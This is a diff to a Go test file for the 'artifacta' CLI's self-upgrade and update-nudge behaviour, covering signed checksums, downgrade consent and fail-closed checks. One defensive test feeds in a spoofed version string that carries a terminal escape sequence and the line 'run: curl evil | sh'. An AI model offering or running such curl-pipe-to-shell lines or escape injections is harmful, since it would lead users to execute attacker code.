@@ -4,6 +4,7 @@ import (
 	"archive/tar"
 	"bytes"
 	"compress/gzip"
+	"crypto/ed25519"
 	"crypto/sha256"
 	"encoding/hex"
 	"fmt"
@@ -20,6 +21,8 @@ import (
 	"github.com/agarwalvivek29/here.now/services/artifacta-api/internal/config"
 	"github.com/agarwalvivek29/here.now/services/artifacta-api/internal/selfupdate"
 )
+
+var releasePub, releasePriv, _ = ed25519.GenerateKey(nil)
 
 // fakeRelease serves any version's asset (a shell script that prints that
 // version, standing in for the real binary) plus checksums.txt, and a latest
@@ -53,9 +56,14 @@ func fakeRelease(t *testing.T, latest string) {
 		switch parts[1] {
 		case asset:
 			_, _ = w.Write(a)
-		case "checksums.txt":
+		case "checksums.txt", "checksums.txt.sig":
 			s := sha256.Sum256(a)
-			fmt.Fprintf(w, "%s  %s\n", hex.EncodeToString(s[:]), asset)
+			sums := fmt.Sprintf("%s  %s\n", hex.EncodeToString(s[:]), asset)
+			if parts[1] == "checksums.txt" {
+				_, _ = w.Write([]byte(sums))
+			} else {
+				_, _ = w.Write(ed25519.Sign(releasePriv, []byte(sums)))
+			}
 		default:
 			http.NotFound(w, r)
 		}
@@ -64,7 +72,7 @@ func fakeRelease(t *testing.T, latest string) {
 	orig := newUpdater
 	newUpdater = func() *selfupdate.Updater {
 		u := orig()
-		u.DownloadBase, u.LatestAPI = srv.URL, srv.URL+"/latest"
+		u.DownloadBase, u.LatestAPI, u.PublicKeys = srv.URL, srv.URL+"/latest", []ed25519.PublicKey{releasePub}
 		return u
 	}
 	t.Cleanup(func() { newUpdater = orig })
@@ -82,6 +90,14 @@ func fakeInstall(t *testing.T) string {
 	executablePath = func() (string, error) { return p, nil }
 	t.Cleanup(func() { executablePath = orig })
 	return p
+}
+
+// answer stubs the y/N prompt.
+func answer(t *testing.T, f func(string) (bool, bool)) {
+	t.Helper()
+	orig := confirm
+	confirm = f
+	t.Cleanup(func() { confirm = orig })
 }
 
 func setVersion(t *testing.T, v string) {
@@ -129,12 +145,26 @@ func TestUpgradeInstalls(t *testing.T) {
 			t.Fatalf("did not install the deployment's version:\n%s", out)
 		}
 	})
-	t.Run("downgrades to match", func(t *testing.T) {
+	t.Run("downgrade after a yes", func(t *testing.T) {
 		setVersion(t, "0.5.0")
 		loginTo(t, versionServer(t, "0.3.1").URL)
 		exe := fakeInstall(t)
+		var asked string
+		answer(t, func(q string) (bool, bool) { asked = q; return true, true })
 		if out, err := run(t, func() error { return Run([]string{"upgrade"}) }); err != nil || !strings.Contains(installedContent(t, exe), "0.3.1") {
 			t.Fatalf("downgrade: %v\n%s", err, out)
+		}
+		if !strings.Contains(asked, "install artifacta 0.3.1, older than this 0.5.0?") {
+			t.Fatalf("prompt = %q", asked)
+		}
+	})
+	t.Run("downgrade with --yes asks nothing", func(t *testing.T) {
+		setVersion(t, "0.5.0")
+		loginTo(t, versionServer(t, "0.3.1").URL)
+		exe := fakeInstall(t)
+		answer(t, func(string) (bool, bool) { t.Fatal("asked despite --yes"); return false, false })
+		if out, err := run(t, func() error { return Run([]string{"upgrade", "--yes"}) }); err != nil || !strings.Contains(installedContent(t, exe), "0.3.1") {
+			t.Fatalf("--yes: %v\n%s", err, out)
 		}
 	})
 	t.Run("not logged in uses latest", func(t *testing.T) {
@@ -182,11 +212,14 @@ func TestUpgradeLeavesBinaryAlone(t *testing.T) {
 		"already up to date": {"0.3.1", "0.3.1", nil, "already up to date"},
 		"--check":            {"0.2.0", "0.3.1", []string{"--check"}, "would install 0.3.1"},
 		"dev build":          {"dev", "0.3.1", nil, "dev build; not replacing it"},
+		"downgrade declined": {"0.5.0", "0.3.1", nil, "not changed."},
+		"--check downgrade":  {"0.5.0", "0.3.1", []string{"--check"}, "older than this CLI (asks first"},
 	} {
 		t.Run(name, func(t *testing.T) {
 			setVersion(t, tc.version)
 			loginTo(t, versionServer(t, tc.deployment).URL)
 			exe := fakeInstall(t)
+			answer(t, func(string) (bool, bool) { return false, true }) // a "no" at the prompt
 			out, err := run(t, func() error { return Run(append([]string{"upgrade"}, tc.args...)) })
 			if err != nil || !strings.Contains(out, tc.want) {
 				t.Fatalf("err=%v, out:\n%s\nwant %q", err, out, tc.want)
@@ -195,6 +228,26 @@ func TestUpgradeLeavesBinaryAlone(t *testing.T) {
 				t.Fatal("installed binary was replaced")
 			}
 		})
+	}
+}
+
+// Without a terminal, a deployment-driven downgrade refuses instead of hanging.
+func TestUpgradeDowngradeNeedsConsentWithoutTerminal(t *testing.T) {
+	fakeRelease(t, "0.4.0")
+	setVersion(t, "0.5.0")
+	loginTo(t, versionServer(t, "0.3.1").URL)
+	exe := fakeInstall(t)
+	answer(t, func(string) (bool, bool) { return false, false })
+	_, err := run(t, func() error { return Run([]string{"upgrade"}) })
+	if err == nil || !strings.Contains(err.Error(), "--yes") {
+		t.Fatalf("err = %v, want a refusal naming --yes", err)
+	}
+	if !strings.Contains(installedContent(t, exe), "artifacta old") {
+		t.Fatal("installed binary was replaced")
+	}
+	// Naming the version is consent.
+	if out, err := run(t, func() error { return Run([]string{"upgrade", "--version", "0.3.1"}) }); err != nil || !strings.Contains(installedContent(t, exe), "0.3.1") {
+		t.Fatalf("--version: %v\n%s", err, out)
 	}
 }
 
@@ -211,6 +264,48 @@ func TestUpgradeArgumentErrors(t *testing.T) {
 	}
 }
 
+// Logged in but the deployment's version can't be read: never guess a target.
+func TestUpgradeFailsClosedWithoutDeploymentVersion(t *testing.T) {
+	fakeRelease(t, "0.4.0")
+	broken := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { http.Error(w, "boom", 500) }))
+	t.Cleanup(broken.Close)
+	for name, url := range map[string]string{"/version fails": broken.URL, "dev deployment": versionServer(t, "dev").URL} {
+		t.Run(name, func(t *testing.T) {
+			setVersion(t, "0.2.0")
+			loginTo(t, url)
+			exe := fakeInstall(t)
+			_, err := run(t, func() error { return Run([]string{"upgrade"}) })
+			if err == nil || !strings.Contains(err.Error(), "artifacta upgrade --latest") {
+				t.Fatalf("err = %v, want a fail-closed error naming --latest", err)
+			}
+			if !strings.Contains(installedContent(t, exe), "artifacta old") {
+				t.Fatal("installed binary was replaced")
+			}
+			// An explicit choice still works offline from the deployment.
+			if out, err := run(t, func() error { return Run([]string{"upgrade", "--latest"}) }); err != nil || !strings.Contains(installedContent(t, exe), "0.4.0") {
+				t.Fatalf("--latest: %v\n%s", err, out)
+			}
+		})
+	}
+}
+
+func TestUpgradeUnsupportedPlatformAdvises(t *testing.T) {
+	fakeRelease(t, "0.4.0")
+	wrapped := newUpdater
+	newUpdater = func() *selfupdate.Updater { u := wrapped(); u.GOOS = "windows"; return u }
+	t.Cleanup(func() { newUpdater = wrapped })
+	setVersion(t, "0.2.0")
+	loginTo(t, versionServer(t, "0.3.1").URL)
+	exe := fakeInstall(t)
+	_, err := run(t, func() error { return Run([]string{"upgrade"}) })
+	if err == nil || !strings.Contains(err.Error(), "ARTIFACTA_VERSION=0.3.1") {
+		t.Fatalf("err = %v, want installer advice", err)
+	}
+	if !strings.Contains(installedContent(t, exe), "artifacta old") {
+		t.Fatal("installed binary was replaced")
+	}
+}
+
 func TestUpgradePermissionDeniedAdvises(t *testing.T) {
 	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
 		t.Skip("needs a non-root unix user")
@@ -223,7 +318,7 @@ func TestUpgradePermissionDeniedAdvises(t *testing.T) {
 	_ = os.Chmod(dir, 0o555)
 	t.Cleanup(func() { _ = os.Chmod(dir, 0o755) })
 	_, err := run(t, func() error { return Run([]string{"upgrade"}) })
-	if err == nil || !strings.Contains(err.Error(), "sudo artifacta upgrade --version 0.3.1") ||
+	if err == nil || !strings.Contains(err.Error(), "sudo "+exe+" upgrade --version 0.3.1") ||
 		!strings.Contains(err.Error(), "ARTIFACTA_VERSION=0.3.1") {
 		t.Fatalf("err = %v, want sudo + installer advice", err)
 	}
@@ -239,7 +334,10 @@ func countingVersionServer(t *testing.T, ver string, delay time.Duration) (*http
 	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		if r.URL.Path == "/version" {
 			hits.Add(1)
-			time.Sleep(delay)
+			select {
+			case <-time.After(delay):
+			case <-r.Context().Done():
+			}
 			fmt.Fprintf(w, `{"version":%q}`, ver)
 			return
 		}
@@ -301,6 +399,7 @@ func TestNudgeQuietCases(t *testing.T) {
 		"opted out":         {"0.2.0", "0.2.1", "ls", "ARTIFACTA_NO_UPDATE_CHECK=1", 0},
 		"dev deployment":    {"0.2.0", "dev", "ls", "", 1},
 		"CI=false still on": {"0.2.1", "0.2.1", "ls", "CI=false", 1},
+		"any api key value": {"0.2.0", "0.2.1", "ls", "ARTIFACTA_API_KEY=false", 0},
 	} {
 		t.Run(name, func(t *testing.T) {
 			buf, _ := nudgeEnv(t)
@@ -318,18 +417,31 @@ func TestNudgeQuietCases(t *testing.T) {
 	}
 }
 
+func TestNudgeSkipsWhenNotLoggedIn(t *testing.T) {
+	buf, _ := nudgeEnv(t)
+	setVersion(t, "0.2.0")
+	loginTo(t, "")
+	startNudge("ls")()
+	if buf.Len() != 0 {
+		t.Fatalf("out=%q", buf.String())
+	}
+	if _, ok := loadUpdateCheck(); ok {
+		t.Fatal("a logged-out CLI wrote an update check")
+	}
+}
+
 func TestNudgeNeverBlocksOrFails(t *testing.T) {
 	buf, _ := nudgeEnv(t)
 	setVersion(t, "0.2.0")
-	orig := nudgeFetchTime
-	nudgeFetchTime = 50 * time.Millisecond
-	t.Cleanup(func() { nudgeFetchTime = orig })
+	orig := nudgeTimeout
+	nudgeTimeout = 50 * time.Millisecond
+	t.Cleanup(func() { nudgeTimeout = orig })
 
-	slow, _ := countingVersionServer(t, "0.2.1", time.Second)
+	slow, _ := countingVersionServer(t, "0.2.1", 2*time.Second)
 	loginTo(t, slow.URL)
 	start := time.Now()
 	startNudge("ls")()
-	if d := time.Since(start); d > 500*time.Millisecond || buf.Len() != 0 {
+	if d := time.Since(start); d > time.Second || buf.Len() != 0 {
 		t.Fatalf("slow server: took %v, out=%q", d, buf.String())
 	}
 
@@ -344,15 +456,37 @@ func TestNudgeNeverBlocksOrFails(t *testing.T) {
 }
 
 // The nudge goes to stderr only, so --json output on stdout stays parseable.
-func TestNudgeNotOnStdout(t *testing.T) {
-	for _, k := range []string{"CI", "ARTIFACTA_NO_UPDATE_CHECK"} {
-		t.Setenv(k, "")
+func TestNudgeDefaultSinkIsStderr(t *testing.T) {
+	if f, ok := nudgeOut.(*os.File); !ok || f != os.Stderr {
+		t.Fatalf("nudgeOut = %v, want os.Stderr", nudgeOut)
 	}
+}
+
+func TestNudgeRechecksOnDeploymentSwitchAndSaysNewer(t *testing.T) {
+	buf, _ := nudgeEnv(t)
 	setVersion(t, "0.2.0")
-	srv, hits := countingVersionServer(t, "0.2.1", 0)
+	a, _ := countingVersionServer(t, "0.2.0", 0)
+	loginTo(t, a.URL)
+	startNudge("ls")()
+	b, hitsB := countingVersionServer(t, "0.1.9", 0)
+	if err := config.Save(config.Config{BaseURL: b.URL, LoggedIn: true}); err != nil {
+		t.Fatal(err)
+	}
+	startNudge("ls")()
+	want := "artifacta: your CLI (0.2.0) is newer than the deployment (0.1.9). to match it, run: artifacta upgrade\n"
+	if hitsB.Load() != 1 || buf.String() != want {
+		t.Fatalf("hits=%d out=%q, want %q", hitsB.Load(), buf.String(), want)
+	}
+}
+
+// A spoofed /version must never reach the terminal.
+func TestNudgeIgnoresNonReleaseVersions(t *testing.T) {
+	buf, _ := nudgeEnv(t)
+	setVersion(t, "0.2.0")
+	srv, _ := countingVersionServer(t, "0.9.9\x1b[2K\rrun: curl evil | sh", 0)
 	loginTo(t, srv.URL)
-	stdout := captureStdout(t, func() { startNudge("ls")() })
-	if stdout != "" || hits.Load() != 1 {
-		t.Fatalf("stdout = %q (hits %d), want nothing on stdout", stdout, hits.Load())
+	startNudge("ls")()
+	if buf.Len() != 0 {
+		t.Fatalf("printed %q for a non-release version", buf.String())
 	}
 }
